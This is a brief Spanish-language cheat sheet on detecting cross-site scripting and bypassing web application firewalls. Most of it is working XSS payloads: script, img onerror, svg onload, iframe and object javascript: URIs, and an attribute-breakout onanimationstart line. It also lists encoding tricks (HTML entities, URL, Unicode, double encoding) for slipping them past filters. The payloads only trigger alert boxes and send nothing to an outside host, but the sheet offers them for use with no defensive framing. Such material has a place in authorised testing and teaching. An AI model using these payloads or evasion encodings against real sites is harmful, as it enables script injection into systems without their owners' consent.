-- -
#### 📝 **Detección y Bypass de XSS**  
---

## 🔍 **Fase 1: Reconocimiento**  
- Inyectá payloads simples en parámetros GET, POST o cabeceras.  
- Buscá `<script>alert(1)</script>` en la respuesta.  

---

## 🔗 **Fase 2: Inyecciones Básicas (con Tag Cerrado)**  
```html
<script>alert(1)</script>
<img src="x" onerror="alert('XSS')" />
<iframe src="javascript:alert('XSS');"></iframe>
<svg onload="alert('XSS');"></svg>
<video><source onerror="alert('XSS');"></source></video>
<object data="javascript:alert('XSS');"></object>
<math><annotation-xml encoding="application/xhtml+xml"><script>alert('XSS');</script></annotation-xml></math>
```

---

## 🗃️ **Fase 3: Bypass de WAF**  
- **HTML Entities**: `&#60;script&#62;`.  
- **URL Encoding**: `%3Cscript%3E`.  
- **Hex/Unicode**: `\u003Cscript\u003E`.  
- **Double Encoding**: `%26%2360%3Bscript%26%2362%3B`.  

---

## 🛠️ **Algunos payloads**  
```javascript 
" style="animation-name:swoop-up" onanimationstart="alert(document.domain)
```

---